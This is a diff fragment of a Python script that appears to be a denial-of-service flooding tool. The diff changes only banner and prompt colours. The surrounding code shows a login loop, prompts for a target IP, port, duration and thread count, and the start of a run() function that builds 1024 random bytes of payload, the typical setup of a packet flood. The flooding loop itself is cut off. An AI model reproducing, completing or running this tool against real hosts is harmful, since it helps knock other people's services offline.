@@ -33,14 +33,14 @@ print("\033[95m        @         @  @      @         @   @        @     @    \03
 print("\033[94m        @         @  @       @       @   @         @   @      \033[0m")
 print("\033[94m        @ @ @ @ @    @        @     @    @         @ @        \033[0m")
 print("\033[31m        @         @  @         @   @     @         @   @      \033[0m")   
-print("\033[97m        @         @  @          @ @       @        @     @    \033[0m")
-print("\033[97m        @ @ @ @ @    @ @ @ @ @   @          @ @ @  @       @  \033[0m")
+print("\033[94m        @         @  @          @ @       @        @     @    \033[0m")
+print("\033[94m        @ @ @ @ @    @ @ @ @ @   @          @ @ @  @       @  \033[0m")
 print("")     
 print("\033[91m        @ @ @      @ @    @     @  @ @ @ @  @ @ @ @  @ @ @    \033[0m")
 print("\033[91m              @  @     @  @ @   @     @     @        @     @  \033[0m")
 print("\033[93m        @ @ @    @ @ @ @  @   @ @     @     @ @ @    @ @ @    \033[0m")
 print("\033[93m        @        @     @  @     @     @     @ @ @ @  @     @  \033[0m")
-print("\033[33m°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°\033[0m")
+print("\033[94m°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°\033[0m")
 
 while attemps < 100:
     username = input('Enter your username: ')
@@ -55,11 +55,13 @@ while attemps < 100:
         continue
 
 
-ip = str(input(" Target IP :"))
-port = int(input(" Target Port :"))
-choice = str(input(" (y/n) :"))
-times = int(input(" Time :"))
-threads = int(input(" Threads :"))
+ip = str(input("\033[94mTarget IP :  \033[0m"))
+port = int(input("\033[97mTarget Port :  \033[0m"))
+choice = str(input("\033[31m(y/n) :  \033[0m"))
+times = int(input("\033[96mTime : \033[0m"))
+threads = int(input("\033[92mThreads :  \033[0m"))
+
+
 def run():
 	data = random._urandom(1024)
 	i = random.choice(("[*]","[!]","[#]"))
